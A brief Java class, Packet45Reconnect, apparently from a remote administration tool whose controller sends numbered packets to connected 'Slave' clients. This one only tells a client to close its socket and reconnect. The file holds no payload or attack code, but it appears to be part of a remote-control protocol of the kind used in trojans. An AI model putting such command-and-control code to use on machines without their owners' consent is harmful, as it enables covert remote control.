package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;

public class Packet45Reconnect extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Reconnecting"));
	}

	@Override
	public byte getPacketId() {
		return 45;
	}

}
